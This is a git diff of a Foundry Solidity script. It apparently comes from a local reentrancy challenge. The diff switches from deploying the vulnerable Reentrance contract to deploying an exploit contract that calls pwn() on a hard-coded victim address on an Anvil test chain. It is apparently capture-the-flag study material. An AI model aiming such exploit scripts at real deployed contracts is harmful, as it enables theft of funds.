@@ -10,13 +10,12 @@ contract Reentrance_Script is Script{
     function  setUp() public {
         deployer = vm.envUint("ANVIL_PRIVATE_KEY");
         vm.startBroadcast(deployer);
-        r = new Reentrance{value:100}();
-        address payable victim = payable(0x5FbDB2315678afecb367f032d93F642f64180aa3);
+        // r = new Reentrance{value:0.001 ether}();
 
-        // r_exp = new Reentrance_exp{value:0.0005 ether}();
-        // r_exp.pwn(victim);
-        r_exp = new Reentrance_exp{value:50}(victim);
-        r_exp.pwn();
+        address payable victim = payable(0x5FbDB2315678afecb367f032d93F642f64180aa3);
+        
+        r_exp = new Reentrance_exp{value:0.0005 ether}();
+        r_exp.pwn(victim);
         vm.stopBroadcast();
     }
 
